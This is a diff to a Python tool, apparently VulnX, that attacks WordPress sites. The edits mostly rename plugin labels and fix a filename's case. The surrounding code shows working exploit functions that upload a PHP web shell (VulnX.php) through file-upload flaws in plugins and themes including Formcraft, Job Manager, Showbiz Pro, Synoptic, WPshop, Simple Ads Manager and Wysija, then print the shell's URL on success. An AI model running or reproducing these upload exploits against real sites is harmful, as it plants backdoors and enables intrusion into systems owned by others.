@@ -338,7 +338,7 @@ def webhosting_info():
     if region:
         print('%s [*] Region : %s' % (B,region.group(1)))
     
-################ Blaze Plugin #####################
+################ Blaze SlideShow #####################
 
 def wp_blaze():
     headers['Content_Type']:'multipart/form-data'
@@ -355,12 +355,12 @@ def wp_blaze():
     if check_blaze:
         uploadfolder = check_blaze.group(1)
         dump_data = url + "/wp-content/uploads/blaze/"+uploadfolder+"/big/VulnX.php?Vuln=X"
-        print ('%s [%s+%s] Blaze Plugin%s =============> %s VULN%s' %(W,G,W,W,G,W))
+        print ('%s [%s+%s] Blaze SlideShow %s =============> %s VULN%s' %(W,G,W,W,G,W))
         print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s %s %s' % ( G,W,B,W, dump_data,W ))
     else: 
-        print ('%s [%s-%s] Blaze Plugin%s =============> %s FAIL%s' %(W,R,W,W,R,W))    
+        print ('%s [%s-%s] Blaze SlideShow %s =============> %s FAIL%s' %(W,R,W,W,R,W))    
 
-################ Catpro Plugin #####################
+################ Catpro #####################
 
 def wp_catpro():
     headers['Content_Type']:'multipart/form-data'
@@ -382,7 +382,7 @@ def wp_catpro():
     else:
         print ('%s [%s-%s] Catpro Plugin%s ------------- %s FAIL%s' %(W,R,W,W,R,W))    
 
-################ Cherry Plugin #####################
+################ CherryFramework #####################
 
 def  wp_cherry():
     headers['Content_Type']:'multipart/form-data'
@@ -397,12 +397,12 @@ def  wp_cherry():
     content  = response.text
     check_cherry = re.findall("Vuln X", content)
     if check_cherry:
-        print ('%s [%s+%s] Cherry Plugin%s ------------- %s VULN%s' %(W,G,W,W,G,W))
+        print ('%s [%s+%s] CherryFramework%s ------------- %s VULN%s' %(W,G,W,W,G,W))
         print ('%s [*]Shell Uploaded Successfully \n %s link : %s%s ' % ( B,W,dump_data,W))
     else:
-        print ('%s [%s-%s] Cherry Plugin%s ------------- %s FAIL%s' %(W,R,W,W,R,W))    
+        print ('%s [%s-%s] CherryFramework%s ------------- %s FAIL%s' %(W,R,W,W,R,W))    
 
-################ Download Manager Plugin #####################
+################ Download Manager #####################
 def wp_dm():
     headers['Content_Type']:'multipart/form-data'
     options = {
@@ -415,12 +415,12 @@ def wp_dm():
     content  = response.text
     check_dm = re.findall("Vuln X", content)
     if check_dm:
-        print ('%s [%s+%s] Download Manager Plugin%s---- %s VULN%s' %(W,G,W,W,G,W))
+        print ('%s [%s+%s] Download Manager %s---- %s VULN%s' %(W,G,W,W,G,W))
         print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s %s %s' % ( G,W,B,W, dump_data,W))
     else:
-        print ('%s [%s-%s] Download Manager Plugin%s --- %s FAIL%s' %(W,R,W,W,R,W))    
+        print ('%s [%s-%s] Download Manager %s --- %s FAIL%s' %(W,R,W,W,R,W))    
 
-################ powerzoomer Plugin #####################
+################ powerzoomer #####################
 
 def wp_powerzoomer():
     endpoint = url + "/wp-admin/admin.php?page=powerzoomer_manage"
@@ -437,10 +437,10 @@ def wp_powerzoomer():
     if check_powerzoomer:
         uploadfolder = check_powerzoomer.group(1)
         dump_data = url + "/wp-content/uploads/powerzoomer/"+uploadfolder+"/big/VulnX.php?Vuln=X"
-        print ('%s [%s+%s] Powerzoomer Content%s ------- %s VULN%s' %(W,G,W,W,G,W))
+        print ('%s [%s+%s] Powerzoomer %s ------- %s VULN%s' %(W,G,W,W,G,W))
         print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s %s %s' % ( G,W,B,W,dump_data,W ))
     else:
-        print ('%s [%s-%s] Powerzoomer Content%s ------- %s FAIL%s' %(W,R,W,W,R,W))
+        print ('%s [%s-%s] Powerzoomer %s ------- %s FAIL%s' %(W,R,W,W,R,W))
 
 def wp_revslider():
     endpoint = url + "/wp-admin/admin-ajax.php"
@@ -524,7 +524,7 @@ def wp_revslider():
         print ('%s [%s-%s] Revslider Plugin%s ---------- %s FAIL%s' %(W,R,W,W,R,W))
 
 
-################ Fromcraft Plugin #####################
+################ Formcraft #####################
 def wp_fromcraft():
     shell = open('./shell/VulnX.php','rb')
     fields= "files[]"
@@ -538,16 +538,16 @@ def wp_fromcraft():
     dump_data  = url + "/wp-content/plugins/formcraft/file-upload/server/php/files/VulnX.php?Vuln=X"
     check_fromcraft = re.findall("\"files", response)
     if check_fromcraft:
-        print ('%s [%s+%s] Fromcraft Plugin%s ---------- %s VULN%s' %(W,G,W,W,G,W))
+        print ('%s [%s+%s] Formcraft %s ---------- %s VULN%s' %(W,G,W,W,G,W))
         print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s %s %s' % ( G,W,B,W, dump_data,W ))
     else:
-        print ('%s [%s-%s] Fromcraft Plugin%s ---------- %s FAIL%s' %(W,R,W,W,R,W))    
+        print ('%s [%s-%s] Formcraft %s ---------- %s FAIL%s' %(W,R,W,W,R,W))    
 
-################ Job Manager Plugin #####################
+################ Job Manager #####################
 
 def wp_jobmanager():
     endpoint = url + "/jm-ajax/upload_file/"
-    image = open('./shell/vulnx.gif','rb')
+    image = open('./shell/VulnX.gif','rb')
     field = "file[]"
     headers['Content_Type'] = 'multipart/form-data'
     options = {
@@ -555,18 +555,18 @@ def wp_jobmanager():
     }
 
     send_image = requests.post(endpoint,options,headers)
-    dump_data = url + "/wp-content/uploads/job-manager-uploads/file/"+year+"/"+month+"/vulnx.gif"
+    dump_data = url + "/wp-content/uploads/job-manager-uploads/file/"+year+"/"+month+"/VulnX.gif"
     response=requests.get(dump_data, headers)
     res  = response.headers['content-type']
     check_jobmanager = re.findall("image\/gif", res)
     
     if check_jobmanager:
-        print ('%s [%s+%s] Job Manager Plugin%s -------- %s VULN%s' %(W,G,W,W,G,W))
+        print ('%s [%s+%s] Job Manager%s -------- %s VULN%s' %(W,G,W,W,G,W))
         print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s%s%s' % ( G,W,B,W,dump_data,W))
     else:
-        print ('%s [%s-%s] Job Manager Plugin%s -------- %s FAIL%s' %(W,R,W,W,R,W))
+        print ('%s [%s-%s] Job Manager%s -------- %s FAIL%s' %(W,R,W,W,R,W))
 
-################ Showbiz Plugin #####################
+################ Showbiz Pro #####################
 
 def wp_showbiz():
     endpoint = url + "/wp-admin/admin-ajax.php"
@@ -595,12 +595,12 @@ def wp_showbiz():
     res  = response.text
     check_showbiz = re.findall("Vuln X", res)
     if check_showbiz:
-        print ('%s [%s+%s] ShowBiz Plugin%s ------------ %s VULN%s' %(W,G,W,W,G,W))
+        print ('%s [%s+%s] Showbiz Pro%s ------------ %s VULN%s' %(W,G,W,W,G,W))
         print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s%s%s' % ( G,W,B,W,dump_data,W))
     else:
-        print ('%s [%s-%s] ShowBiz Plugin%s ------------ %s FAIL%s' %(W,R,W,W,R,W))
+        print ('%s [%s-%s] Showbiz Pro%s ------------ %s FAIL%s' %(W,R,W,W,R,W))
 
-################ Synoptic Plugin #####################
+################ Synoptic #####################
 
 def wp_synoptic():
     endpoint = url + "/wp-content/themes/synoptic/lib/avatarupload/upload.php"
@@ -617,12 +617,12 @@ def wp_synoptic():
     check_synoptic = re.findall("Vuln X", res)
     
     if check_synoptic:
-        print ('%s [%s+%s] Synoptic Plugin%s ----------- %s VULN%s' %(W,G,W,W,G,W))
+        print ('%s [%s+%s] Synoptic%s ----------- %s VULN%s' %(W,G,W,W,G,W))
         print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s %s %s' % ( G,W,B,W,dump_data,W))
     else:
-        print ('%s [%s-%s] Synoptic Plugin%s ----------- %s FAIL%s' %(W,R,W,W,R,W))
+        print ('%s [%s-%s] Synoptic%s ----------- %s FAIL%s' %(W,R,W,W,R,W))
 
-################ Wpshop Plugin #####################
+################ WPshop eCommerce #####################
 
 def wp_shop():
     endpoint = url + "/wp-content/plugins/wpshop/includes/ajax.php?elementCode=ajaxUpload"
@@ -638,10 +638,10 @@ def wp_shop():
     res  = response.text
     check_shop = re.findall("Vuln X", res)
     if check_shop:
-        print ('%s [%s+%s] WPShop Plugin%s ------------- %s VULN%s' %(W,G,W,W,G,W))
+        print ('%s [%s+%s] WPshop eCommerce%s ------------- %s VULN%s' %(W,G,W,W,G,W))
         print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s%s%s' % ( G,W,B,W,dump_data,W))
     else:
-        print ('%s [%s-%s] WPShop Plugin%s ------------- %s FAIL%s' %(W,R,W,W,R,W))
+        print ('%s [%s-%s] WPshop eCommerce%s ------------- %s FAIL%s' %(W,R,W,W,R,W))
 
 ################ Content Injection #####################
 
@@ -656,7 +656,7 @@ def wp_injection():
         print ('%s [%s-%s] Injection Content%s --------- %s FAIL%s' %(W,R,W,W,R,W))
 
 
-################ Ads Manager Plugin #####################
+################ Simple Ads Manager #####################
 
 def wp_adsmanager():
     endpoint = url + "/wp-content/plugins/simple-ads-manager/sam-ajax-admin.php"
@@ -679,7 +679,7 @@ def wp_adsmanager():
     else:
         print ('%s [%s-%s] Simple Ads Manager%s -------- %s FAIL%s' %(W,R,W,W,R,W))
 
-################ Wysija Theme #####################
+################ Wysija Newsletters #####################
 
 def wp_wysija():
     theme = "my-theme"
@@ -701,12 +701,12 @@ def wp_wysija():
     res  = response.text
     check_wysija = re.findall("Vuln X", res)
     if check_wysija:
-        print ('%s [%s+%s] Wysija Theme%s -------------- %s VULN%s' %(W,G,W,W,G,W))
+        print ('%s [%s+%s] Wysija Newsletters%s -------------- %s VULN%s' %(W,G,W,W,G,W))
         print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s%s%s' % ( G,W,B,W,dump_data,W))
     else:
-        print ('%s [%s-%s] Wysija Theme%s -------------- %s FAIL%s' %(W,R,W,W,R,W))
+        print ('%s [%s-%s] Wysija Newsletters%s -------------- %s FAIL%s' %(W,R,W,W,R,W))
 
-################ Ads Manager Plugin #####################
+################ InBoundio Marketing #####################
 
 def wp_inboundiomarketing():
     endpoint = url + "/wp-content/plugins/inboundio-marketing/admin/partials/csv_uploader.php"
